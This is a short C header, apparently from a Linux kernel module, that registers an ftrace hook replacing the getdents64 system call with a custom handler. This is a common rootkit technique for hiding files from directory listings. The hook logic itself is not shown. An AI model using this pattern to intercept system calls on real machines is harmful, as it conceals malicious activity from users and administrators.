#pragma once

#include "ftrace_helper.h"

#include "hooks_getdents64.h"

static struct ftrace_hook syscall_hooks[] = {
    HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),
};
